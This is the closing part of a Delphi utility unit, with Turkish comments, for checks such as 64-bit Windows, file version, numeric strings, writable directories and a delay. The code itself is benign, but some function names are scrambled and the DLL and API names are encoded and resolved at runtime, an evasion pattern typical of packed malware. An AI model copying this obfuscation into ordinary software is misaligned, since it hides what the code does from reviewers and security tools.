
function I6Bt: Boolean;
type
  TIsWow64Process = function(hProcess: THandle; var Wow64Process: BOOL): BOOL; stdcall;
var
  DLLHandle: THandle;
  pIsWow64Process: TIsWow64Process;
  IsWow64: BOOL;
begin
  Result := False;
  DllHandle := LoadLibrary(PChar(DE('ixmer1dIvAgTkvvJ')));
  if DLLHandle <> 0 then begin
    pIsWow64Process := GetProcAddress(DLLHandle, PChar(DE('A1O3mmWMRX2NRKgphQO')));
    Result := Assigned(pIsWow64Process) and pIsWow64Process(GetCurrentProcess, IsWow64) and IsWow64;
    FreeLibrary(DLLHandle);
  end;
end; { Is64Bit -> Check Windows 64 Bit }

function FiVr(sFileName: string): Integer;
var
  VerInfoSize: DWORD;
  VerInfo: Pointer;
  VerValueSize: DWORD;
  VerValue: PVSFixedFileInfo;
  Dummy: DWORD;
  R: string;
begin
  R := '';
  VerInfoSize := GetFileVersionInfoSize(PChar(sFileName), Dummy);
  GetMem(VerInfo, VerInfoSize);
  GetFileVersionInfo(PChar(sFileName), 0, VerInfoSize, VerInfo);
  VerQueryValue(VerInfo, '\', Pointer(VerValue), VerValueSize);
  with VerValue^ do
  begin
    R := IntToStr(dwFileVersionMS shr 16);
    R := R + IntToStr(dwFileVersionMS and $FFFF);
    R := R + IntToStr(dwFileVersionLS shr 16);
    R := R + IntToStr(dwFileVersionLS and $FFFF);
  end;
  FreeMem(VerInfo, VerInfoSize);

  Result := StrToInt(R);
end; { FileVersion -> Get File Version }

function AddSlash(S: string): string;
begin
  Result := IncludeTrailingPathDelimiter(S);
end; { AddSlash -> Slash Ekler }

function IsStrANumber(pcString: PChar): Boolean;
begin
  Result := False;
  while pcString^ <> #0 do begin
    if not (pcString^ in ['0'..'9']) then Exit;
    Inc(pcString);
  end;
  Result := True;
end; { IsStrANumber -> Stringin Sayýsal olup olmadýðýný denetler }

function IsDirectoryWritable(const Dir: string): Boolean;
var
  TempFile: array[0..MAX_PATH] of Char;
begin
  if GetTempFileName(PChar(Dir), 'DA', 0, TempFile) <> 0 then
    Result := Windows.DeleteFile(TempFile)
  else
    Result := False;
end; { IsDirectoryWritable -> Dizinin Yazýlabilirliðini Denetler }

procedure Delay(Milliseconds: Integer);
  {by Hagen Reddmann}
var
  Tick: DWORD;
  Event: THandle;
begin
  Event := CreateEvent(nil, False, False, nil);
  try
    Tick := GetTickCount + DWORD(Milliseconds);
    while (Milliseconds > 0) and
      (MsgWaitForMultipleObjects(1, Event, False, Milliseconds,
      QS_ALLINPUT) <> WAIT_TIMEOUT) do
    begin
      Application.ProcessMessages;
      Milliseconds := Tick - GetTickCount;
    end;
  finally
    CloseHandle(Event);
  end;
end;

end.

